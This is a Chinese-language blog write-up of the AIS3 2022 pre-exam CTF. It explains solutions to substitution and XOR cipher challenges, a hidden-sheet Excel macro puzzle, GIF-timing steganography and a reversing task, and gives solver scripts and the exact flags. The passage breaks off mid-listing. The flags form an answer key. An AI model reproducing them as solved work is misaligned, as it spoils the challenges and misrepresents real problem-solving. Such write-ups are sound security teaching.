<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2022 AIS3 Pre-exam Write Up | M3t30r</title><meta name="keywords" content="AIS3,Security,CTF"><meta name="author" content="Albert Huang,alb105322129@gmail.com"><meta name="copyright" content="Albert Huang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="今年是我第二年參加 AIS3 的 Pre-Exam，有了去年的經驗今年打起來相對順手不少，但還是希望能夠繼續進步～去年很多解不出來或解很久的類別今年也打得相對比較好，希望之後能夠拿到更好的名次!(今年因為高三要考試ㄌ QQ 沒有花太多時間打，明年要繼續精進!) AIS3 官方網站  WelcomeWelcome [100]Discord ++   嗯對，真的就 Welcome，比賽時間還沒開始就在">
<meta property="og:type" content="article">
<meta property="og:title" content="2022 AIS3 Pre-exam Write Up">
<meta property="og:url" content="http://albert-notes.github.io/2022/06/11/AIS3-2022-preexam/index.html">
<meta property="og:site_name" content="M3t30r">
<meta property="og:description" content="今年是我第二年參加 AIS3 的 Pre-Exam，有了去年的經驗今年打起來相對順手不少，但還是希望能夠繼續進步～去年很多解不出來或解很久的類別今年也打得相對比較好，希望之後能夠拿到更好的名次!(今年因為高三要考試ㄌ QQ 沒有花太多時間打，明年要繼續精進!) AIS3 官方網站  WelcomeWelcome [100]Discord ++   嗯對，真的就 Welcome，比賽時間還沒開始就在">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://albert-notes.github.io/img/ais2.png">
<meta property="article:published_time" content="2022-06-11T00:40:08.000Z">
<meta property="article:modified_time" content="2022-08-05T12:12:22.843Z">
<meta property="article:author" content="Albert Huang">
<meta property="article:tag" content="AIS3">
<meta property="article:tag" content="Security">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://albert-notes.github.io/img/ais2.png"><link rel="shortcut icon" href="/img/fav.ico"><link rel="canonical" href="http://albert-notes.github.io/2022/06/11/AIS3-2022-preexam/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-08-05 20:12:22'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/alb.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/videos/"><i class="fa-fw fas fa-desktop"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/certificates/"><i class="fa-fw fas fa-certificate"></i><span> Certificates</span></a></div><div class="menus_item"><a class="site-page" href="/resources/"><i class="fa-fw fas fa-lightbulb"></i><span> Resources</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-address-card"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/ais2.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">M3t30r</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/videos/"><i class="fa-fw fas fa-desktop"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/certificates/"><i class="fa-fw fas fa-certificate"></i><span> Certificates</span></a></div><div class="menus_item"><a class="site-page" href="/resources/"><i class="fa-fw fas fa-lightbulb"></i><span> Resources</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-address-card"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2022 AIS3 Pre-exam Write Up</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-06-11T00:40:08.000Z" title="Created 2022-06-11 08:40:08">2022-06-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-08-05T12:12:22.843Z" title="Updated 2022-08-05 20:12:22">2022-08-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Computer-Science/">Computer Science</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">7.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>34min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2022 AIS3 Pre-exam Write Up"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>今年是我第二年參加 AIS3 的 Pre-Exam，有了去年的經驗今年打起來相對順手不少，但還是希望能夠繼續進步～去年很多解不出來或解很久的類別今年也打得相對比較好，希望之後能夠拿到更好的名次!(今年因為高三要考試ㄌ QQ 沒有花太多時間打，明年要繼續精進!)</p>
<p><a target="_blank" rel="noopener" href="https://ais3.org/">AIS3 官方網站</a></p>
<p><img src="https://i.imgur.com/fYYXi3P.jpg"></p>
<h1 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h1><h2 id="Welcome-100"><a href="#Welcome-100" class="headerlink" title="Welcome [100]"></a>Welcome [100]</h2><div class="note default flat"><p>Discord ++</p>
</div>

<p>嗯對，真的就 Welcome，比賽時間還沒開始就在 AIS3 Discord<code>#general</code>上的釘選了:P<br>P.S.之前被騙太多次一開始以為這是假 flag:P</p>
<p><img src="https://i.imgur.com/JQ0s5FR.jpg"></p>
<p>FLAG:<code>AIS3&#123;WTF did I just see the FLAG before CTF starts?&#125;</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="SC-100-baby"><a href="#SC-100-baby" class="headerlink" title="SC [100] [baby]"></a>SC [100] [baby]</h2><div class="note default flat"><p>SC? SuperChat?<br>Author: maple3142</p>
</div>

<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1EGbG7XymDej546FAN_gJbUoNkSjnYbd3/view?usp=sharing">https://drive.google.com/file/d/1EGbG7XymDej546FAN_gJbUoNkSjnYbd3/view?usp=sharing</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = <span class="built_in">list</span>(x)</span><br><span class="line">    random.shuffle(x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">T, file</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file) <span class="keyword">as</span> f:</span><br><span class="line">        pt = f.read()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;file&#125;</span>.enc&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pt.translate(T))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">charset = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">shuffled = <span class="string">&quot;&quot;</span>.join(shuffle(charset))</span><br><span class="line">T = <span class="built_in">str</span>.maketrans(charset, shuffled)</span><br><span class="line"></span><br><span class="line">encrypt(T, <span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">encrypt(T, __file__)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Substitution cipher</span></span><br><span class="line"><span class="string">From Wikipedia, the free encyclopedia</span></span><br><span class="line"><span class="string">Jump to navigationJump to search</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.</span></span><br><span class="line"><span class="string">Find sources: &quot;Substitution cipher&quot; – news · newspapers · books · scholar · JSTOR (March 2009) (Learn how and when to remove this template message)</span></span><br><span class="line"><span class="string">In cryptography, a substitution cipher is a method of encrypting in which units of plaintext are replaced with the ciphertext, in a defined manner, with the help of a key; the &quot;units&quot; may be single letters (the most common), pairs of letters, triplets of letters, mixtures of the above, and so forth. The receiver deciphers the text by performing the inverse substitution process to extract the original message.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Substitution ciphers can be compared with transposition ciphers. In a transposition cipher, the units of the plaintext are rearranged in a different and usually quite complex order, but the units themselves are left unchanged. By contrast, in a substitution cipher, the units of the plaintext are retained in the same sequence in the ciphertext, but the units themselves are altered.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">There are a number of different types of substitution cipher. If the cipher operates on single letters, it is termed a simple substitution cipher; a cipher that operates on larger groups of letters is termed polygraphic. A monoalphabetic cipher uses fixed substitution over the entire message, whereas a polyalphabetic cipher uses a number of substitutions at different positions in the message, where a unit from the plaintext is mapped to one of several possibilities in the ciphertext and vice versa.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Contents</span></span><br><span class="line"><span class="string">1	Simple substitution</span></span><br><span class="line"><span class="string">1.1	Security for simple substitution ciphers</span></span><br><span class="line"><span class="string">2	Nomenclator</span></span><br><span class="line"><span class="string">3	Homophonic substitution</span></span><br><span class="line"><span class="string">4	Polyalphabetic substitution</span></span><br><span class="line"><span class="string">5	Polygraphic substitution</span></span><br><span class="line"><span class="string">6	Mechanical substitution ciphers</span></span><br><span class="line"><span class="string">7	The one-time pad</span></span><br><span class="line"><span class="string">8	Substitution in modern cryptography</span></span><br><span class="line"><span class="string">9	Substitution ciphers in popular culture</span></span><br><span class="line"><span class="string">10	See also</span></span><br><span class="line"><span class="string">11	References</span></span><br><span class="line"><span class="string">12	External links</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>題目給了一個<code>cipher.py</code>、加密過的<code>cipher.py.enc</code>與加密過的<code>flag.txt.enc</code>，經過觀察兩個 python 檔的內容後，可以發現本題是 Substitution cipher(人家都直接寫給你看ㄌ w)，因此可以手動將<code>cipher.py</code>與<code>cipher.py.enc</code>對應一一對應字母後推出<code>flag.txt.enc</code>的 flag 內容。</p>
<p>當然我們也可以寫 code 來解決它&gt;&lt;開一個 python 的 dictionary 來進行一一對應:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">waku = <span class="built_in">open</span>(<span class="string">&quot;cipher.py&quot;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">wakuwaku = <span class="built_in">open</span>(<span class="string">&quot;cipher.py.enc&quot;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">sc = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(waku)):</span><br><span class="line">    sc[wakuwaku[i]] = waku[i]</span><br><span class="line"></span><br><span class="line">wakuwakuwaku = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt.enc&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> wakuwakuwaku:</span><br><span class="line">    <span class="built_in">print</span>(sc[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#AIS3&#123;s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack&#125;</span></span><br></pre></td></tr></table></figure>

<p>FLAG:<code>AIS3&#123;s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack&#125;</code></p>
<h2 id="Fast-Cipher-100-baby"><a href="#Fast-Cipher-100-baby" class="headerlink" title="Fast Cipher [100] [baby]"></a>Fast Cipher [100] [baby]</h2><div class="note default flat"><p><img src="https://i.imgur.com/vCc85Hh.png"><br>Author: maple3142</p>
</div>

<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1bkwIfXNl9e3AaoltnvFGb0VEvOTMtd2D/view?usp=sharing">https://drive.google.com/file/d/1bkwIfXNl9e3AaoltnvFGb0VEvOTMtd2D/view?usp=sharing</a></p>
</blockquote>
<p>這題內容是一個加密用<code>cipher.py</code>與其<code>output.txt</code>，來看看 source code:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"></span><br><span class="line">M = <span class="number">2</span>**<span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># this is a *fast* function</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="number">4</span> * x**<span class="number">4</span> + <span class="number">8</span> * x**<span class="number">8</span> + <span class="number">7</span> * x**<span class="number">7</span> + <span class="number">6</span> * x**<span class="number">6</span> + <span class="number">3</span> * x**<span class="number">3</span> + <span class="number">0x48763</span></span><br><span class="line">    ) % M</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pt, key</span>):</span></span><br><span class="line">    ct = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> pt:</span><br><span class="line">        ct.append(c ^ (key &amp; <span class="number">0xFF</span>))</span><br><span class="line">        key = f(key)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = randbelow(M)</span><br><span class="line">    ct = encrypt(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip(), key)</span><br><span class="line">    <span class="built_in">print</span>(ct.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>可以發現他不斷將<code>key</code>迭代到<code>f(x)</code>裡面後再與原始 flag 進行 xor，得到加密後的 output。</p>
<p>此時觀察 encrypt function，它在取<code>key</code>時用了<code>&amp;0xff</code>，表示只取<code>key</code>的最後兩位進行 xor 運算，透過 flag format<code>AIS3&#123;…&#125;</code>可以推出第一個<code>key</code>為<code>0x6c^65=0x2d</code>，接著觀察 <code>f(x)</code>，它代入一個多項式後再<code>%</code>$2^{1024}$<code>=0x100…00</code>，迭代效率很低，但因為只取最後兩位，且<code>%</code>之尾數為<code>0</code>表示不影響最後兩位結果，所以可以直接代入多項式後取最後兩位 xor。</p>
<p>寫 code 即可解出 flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">key=[<span class="number">0x2d</span>]</span><br><span class="line"></span><br><span class="line">ff=[<span class="number">0x6c</span>,<span class="number">0x0e</span>,<span class="number">0xc8</span>,<span class="number">0x40</span>,<span class="number">0xf8</span>,<span class="number">0x8d</span>,<span class="number">0x4c</span>,<span class="number">0xd7</span>,<span class="number">0xfc</span>,<span class="number">0xc6</span>,<span class="number">0xd5</span>,<span class="number">0xc6</span>,<span class="number">0xd1</span>,<span class="number">0xda</span>,<span class="number">0xfc</span>,<span class="number">0xc1</span>,<span class="number">0xca</span>,<span class="number">0xd7</span>,<span class="number">0xd0</span>,<span class="number">0xfc</span>,<span class="number">0xc2</span>,<span class="number">0xd1</span>,<span class="number">0xc6</span>,<span class="number">0xfc</span>,<span class="number">0xd6</span>,<span class="number">0xd0</span>,<span class="number">0xc6</span>,<span class="number">0xc7</span>,<span class="number">0xfc</span>,<span class="number">0xcf</span>,<span class="number">0xcc</span>,<span class="number">0xcf</span>,<span class="number">0xde</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="number">4</span> * x**<span class="number">4</span> + <span class="number">8</span> * x**<span class="number">8</span> + <span class="number">7</span> * x**<span class="number">7</span> + <span class="number">6</span> * x**<span class="number">6</span> + <span class="number">3</span> * x**<span class="number">3</span> + <span class="number">0x48763</span></span><br><span class="line">    ) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(key[i]^ff[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    key.append(f(key[i]))</span><br></pre></td></tr></table></figure>

<p>FLAG:<code>AIS3&#123;not_every_bits_are_used_lol&#125;</code></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Excel-100-baby"><a href="#Excel-100-baby" class="headerlink" title="Excel [100] [baby]"></a>Excel [100] [baby]</h2><div class="note default flat"><p>Don’t worry, this is not a real virus…<br>Author: lys0829</p>
</div>

<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/12dOYZhOIgCRudHczsikOUBUPZFyP8nrJ/view?usp=sharing">https://drive.google.com/file/d/12dOYZhOIgCRudHczsikOUBUPZFyP8nrJ/view?usp=sharing</a></p>
</blockquote>
<p>這題單純給了一個.xlsm 檔，使用 Microsoft Office 文件檢查功能之後可以發現有隱藏工作表，因此全部展開，發現<code>isFki</code>裡面有一串公式，將 excel 轉換字體顏色後發現執行為<code>TRUE</code>，將外圍 FORMULA 去掉後關掉顯示公式查看公式內容即可得到 flag。</p>
<p><img src="https://i.imgur.com/y34cqIJ.jpg"></p>
<p>FLAG:<code>AIS3&#123;XLM_iS_to0_o1d_but_co0o0o00olll!!&#125;</code></p>
<h2 id="Gift-in-the-dream-100-medium"><a href="#Gift-in-the-dream-100-medium" class="headerlink" title="Gift in the dream [100] [medium]"></a>Gift in the dream [100] [medium]</h2><div class="note default flat"><p>Someone send you his dream. Maybe he is trying to tell you a message.<br>update 1: flag 在<em>l33t</em>前是通順的句子。<br>update 2: Fixed typo in flag, please download the updated version<br>Author: bronson113</p>
</div>

<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1OOF36yj53MSXs2-Z-5x1dJivlz25UoLY/view?usp=sharing">https://drive.google.com/file/d/1OOF36yj53MSXs2-Z-5x1dJivlz25UoLY/view?usp=sharing</a></p>
</blockquote>
<p>這題是一個 gif 檔，一開始用了不少工具分析，其中使用 strings 指令的結果發現裡面提示到<code>why is the animation lagging? why is the duration so weird? is this just a dream?</code>的部分，因此開始往這個方向走，上網查到了<a target="_blank" rel="noopener" href="https://gifduration.herokuapp.com/">gif duration tool</a>，切開後發現其毫秒時間間隔不一且形同<code>ASCII code</code>(去掉尾 0)，將其解密後即可得到正確的 flag。</p>
<p>P.S.一開始用了一個爛掉的工具得到錯誤的 flag…</p>
<p><img src="https://i.imgur.com/Ug3wG7B.jpg"></p>
<p>FLAG:<code>AIS3&#123;5T3gn0gR4pHy_c4N_b3_fUn_s0m37iMe&#125;</code></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Time-Management-100-baby"><a href="#Time-Management-100-baby" class="headerlink" title="Time Management [100] [baby]"></a>Time Management [100] [baby]</h2><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution 1"></a>Solution 1</h3><div class="note default flat"><p>Free flag for you : )<br>Author: artis24106</p>
</div>

<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/11_Q8SqsPWEm67iAc2Xbpjvi4tK-Q0Fcn/view?usp=sharing">https://drive.google.com/file/d/11_Q8SqsPWEm67iAc2Xbpjvi4tK-Q0Fcn/view?usp=sharing</a></p>
</blockquote>
<p>這題給了一個 binary，用 IDA Pro 開啟分析<code>main function</code>可以發現它將指定位置<code>4*(i+1)</code>(此位置為 flag 每四位 hex number 的後一位數字)的<code>key</code>與<code>secret</code>每位 xor 後用 for 迴圈輸出，所以這部分可以手動處理 xor 後即可得到 flag。</p>
<p><img src="https://i.imgur.com/D7vn78o.jpg"></p>
<p>我們也可以寫 code 來解決他，首先在 IDA Pro 裡<code>shift+E</code>提出<code>key</code>跟<code>secret</code>陣列，接著一一 xor 即可(但要記得把陣列位置算好.w.)。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span 